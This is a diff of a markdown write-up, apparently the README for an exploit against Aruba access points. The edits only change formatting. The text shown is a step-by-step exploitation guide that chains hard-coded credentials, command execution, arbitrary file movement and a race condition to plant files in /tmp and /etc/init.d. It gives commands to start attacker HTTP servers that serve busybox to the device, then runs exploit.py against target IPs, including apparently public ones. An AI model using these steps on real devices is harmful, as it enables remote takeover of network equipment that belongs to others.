@@ -387,21 +387,15 @@ Then we can upload a malicious /tmp/debug_modem_sw to the system.<br>
 Combined with this information, you can eventually execute arbitrary system commands.<br>
 ### 4.3 Vulnerability exploitation process
 
-**Step 1**: Upload /tmp/debug_modem_sw file
-
- (hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login + Unauthorized arbitrary file movement vulnerability + win race condition)
-
-**Step 2:** Upload the /etc/init.d/auto_sw_funcs file 
-
-(hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login + unauthorized arbitrary file movement vulnerability + win race condition)
-
-**Step 3**: Execute the /aruba/bin/usb_modem_debug script
-
- (hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login)
-
+**Step 1**: Upload /tmp/debug_modem_sw file<br>
+ (hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login + Unauthorized arbitrary file movement vulnerability + win race condition)<br>
+**Step 2:** Upload the /etc/init.d/auto_sw_funcs file<br>
+(hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login + unauthorized arbitrary file movement vulnerability + win race condition)<br>
+**Step 3**: Execute the /aruba/bin/usb_modem_debug script<br>
+ (hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login)<br>
 .<br>
 The command I execute in the auto_sw_funcs file is:<br>
-This command can be modified in the exploit_httpserver.py file
+This command can be modified in the exploit_httpserver.py file<br>
 
 ```
 exploit_cmd = '''
@@ -425,7 +419,6 @@ python exploit_httpserver.py --exploit_http_server_ip=10.0.4.54
 
 exploit_http_server_ip is the ip of the http server server,the value must be a server address accessible to the public network<br>
 This step is to start an http server server with a slow transfer rate<br>
-
 **Step 2:**  Open a new command line terminal under the exploit file and execute the following command
 
 ```
@@ -435,7 +428,6 @@ python3 -m http.server 8888
 This step is to start an http server server for the device to download the busybox file<br>
 
 **Step 3:**  Open a new command line terminal under the exploit file and execute the following command
-
 ```
 python exploit.py --aruba_ap_ip=10.0.4.102 --action=exploit --exploit_http_server_ip=10.0.4.54
 python exploit.py --aruba_ap_ip=118.163.110.217 --action=exploit --exploit_http_server_ip=123.60.137.236
@@ -445,7 +437,6 @@ aruba_ap_ip indicates the ip address of the target device to be exploited<br>
 exploit_http_server_ip is the ip of the http server server<br>
 action defaults to exploit<br>
 Wait quietly for exploit.py to finish executing, then proceed to step 4<br>
-
 **Step 4:** Open a new command line terminal under the exploit file and execute the following command
 
 ```
